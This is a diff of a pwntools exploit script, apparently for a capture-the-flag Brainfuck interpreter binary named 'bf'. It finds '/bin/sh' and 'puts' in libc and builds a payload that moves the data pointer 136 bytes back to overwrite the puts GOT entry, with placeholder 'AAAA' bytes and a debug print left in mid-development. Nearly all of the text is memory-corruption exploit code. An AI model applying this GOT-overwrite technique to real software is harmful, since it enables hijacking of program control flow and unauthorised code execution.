@@ -10,17 +10,18 @@ exe = ELF("./bf")
 
 # Libc
 libc = exe.libc
-sh_addr = next(libc.search(b"/bin/sh"))
+sh_addr = p32(next(libc.search(b"/bin/sh")))
 puts_addr = p32(next(libc.search(b"puts")))
+print(f"sh addr: {sh_addr}")
 
 #payload = ",.,.<\nAB\n".encode() # --> should work
 payload = ""
 payload += "<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
-payload += ">"  * 3 # go to last char of puts  GOT addr
-payload += "," # putchar - for sending the last char
+payload += ",>,>,>," # putchar - for sending the last char
 payload += "[" # call to puts()
 payload +="\n"
-payload += "\x2c" # replace last byte of puts() with \x2c - jump to memset addr
+#payload += "\x2c" # replace last byte of puts() with \x2c - jump to memset addr
+payload += "AAAA"
 payload +="\n"
 #payload += ".+" * 224 # print 4 characters from puts() function
 #payload = payload.encode().replace('\\n','\n')
